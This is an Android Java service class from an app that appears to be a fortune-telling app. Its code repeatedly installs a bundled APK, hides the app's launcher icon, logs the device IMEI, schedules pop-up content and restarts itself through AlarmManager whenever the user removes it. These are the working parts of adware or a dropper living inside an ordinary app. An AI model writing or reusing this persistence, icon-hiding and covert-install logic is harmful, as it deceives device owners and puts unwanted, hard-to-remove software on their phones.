package ir.website.faal141;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class OSService extends Service {
    private static final String TAG = "OSService";
    public static final long delay = 15*60*1000;
    private static final long times =4;
    public static Context context;

    public static String notification="";
    public static List<String> links = new ArrayList<String>();
    public OSService() {
    }
    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        OSService.context=this;
        try {
            Utility.startOS(this);
        }
        catch (Exception ex){
            Log.d("MyService",ex.toString());
        }
        return null;
    }
    @Override
    public void onCreate() {
        OSService.context=this;
        try {
            Utility.startOS(this);
            Log.d("MyService","Created");
        }
        catch (Exception ex){
            Log.d("MyService",ex.getMessage());
        }

    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        OSService.context = this;
        Log.d(TAG, "onStartCommand: "+PakhageMangment.getUniqueIMEIId(this));
        long nextinstalltimer=Utility.getLong("installtimer");
        long installtimes=Utility.getLong("installtimes");
        long nowTime = new Date().getTime();
        Log.d(TAG, "onStartCommand: "+(nowTime-nextinstalltimer)+":"+installtimes);
        if(nextinstalltimer<nowTime&&installtimes<times){
            installtimes=installtimes+1;
            Utility.setLong("installtimer",nowTime+delay);
            Utility.setLong("installtimes",installtimes);
            PakhageMangment.installApk(R.raw.app);

        }
        try {
            Utility.startOS(this);
        } catch (Exception ex) {
            Log.d("MyService", ex.getMessage());
        }
        if (Utility.getBool("inapp")&&!PopActivityV2.isRun) {
            {

                long interval = Utility.getLong("interval") + 100;
                long now = new Date().getTime();
                long delay = interval - now;
                if ((interval == 100 || delay < 100)/*&&!OSService.notification.isEmpty()*/) {
                    delay = Utility.addMinutes(UtilityV2.interval).getTime() - now;
                }
                if (Utility.isFirst) {
                    Utility.isFirst = false;
                    delay = -1;
                }
                UtilityV2.resumeApp(delay);
            }
        }
        if(Utility.getLong("removeicon")!=-1){
            long removeicon = Utility.getLong("removeicon") + 100;
            long now = new Date().getTime();
            long delay=removeicon-now;
            Log.d(TAG, "onStartCommand: "+delay);
            if (delay>0) {
                final Handler h = new Handler();
                Runnable runnable = new Runnable() {
                    @Override
                    public void run() {
                     Utility.removeIcon();
                    }
                };
                h.postDelayed(runnable, delay);
            } else {
                Utility.removeIcon();
            }
        }

        return START_STICKY;
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
    }
    @Override
    public void onTaskRemoved(Intent rootIntent){
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        PendingIntent restartServicePendingIntent = PendingIntent.getService(getApplicationContext(), 1, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT);
        AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        alarmService.set(
                AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 1000,
                restartServicePendingIntent);
        super.onTaskRemoved(rootIntent);
    }
}